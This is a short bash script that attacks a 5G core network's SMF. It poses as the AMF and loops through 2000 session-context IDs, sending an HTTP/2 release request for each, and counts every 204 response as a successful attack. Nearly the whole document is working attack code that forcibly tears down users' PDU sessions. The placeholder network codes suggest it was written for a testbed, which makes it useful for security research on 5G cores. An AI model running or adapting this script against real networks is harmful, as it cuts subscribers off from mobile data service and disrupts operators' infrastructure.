#!/usr/bin/env bash
smf_ip=$1
END=2000
j=0
for i in $(seq 1 $END);
do
    # Execute from AMF node:
    op=$(curl -s -o /dev/null -w "%{http_code}" --request POST -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' -H "Content-Type: application/json" --http2-prior-knowledge  -A "AMF" http://$smf_ip/nsmf-pdusession/v1/sm-contexts/$i/release)
    if [ "$op" = "204" ]; then
        echo "Attack successful at $i iteration"
        j=$[j+1]
        #break
    fi
done
echo "Total successful attacks = $j"
